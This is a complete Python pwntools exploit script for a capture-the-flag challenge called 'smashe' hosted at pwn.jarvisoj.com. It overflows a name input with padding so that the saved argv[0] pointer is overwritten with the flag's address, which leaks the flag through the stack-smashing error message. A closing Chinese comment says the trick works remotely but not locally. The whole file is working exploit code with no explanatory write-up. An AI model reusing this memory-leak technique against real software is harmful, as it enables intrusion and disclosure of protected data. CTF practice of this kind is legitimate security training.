#!/usr/bin/python
from pwn import *
context.log_level = 'debug'
#pr = process("./smashe")
pr = remote('pwn.jarvisoj.com',9877)
argv0_addr = 0x7fffffffe068
input_addr = 0x7fffffffde50
flag_addr = 0x400d20

payload = 'a'*(argv0_addr - input_addr)+p64(flag_addr)
pr.recvuntil('name? ')
pr.sendline(payload)
pr.interactive()
#pr.recvuntil('flag: ')
#pr.sendline('aa')
#data = pr.recv()
'''
在本机测试无法输出信息，只是提示检测到stack smashe，远程可以拿到flag，应该是系统的原因
'''
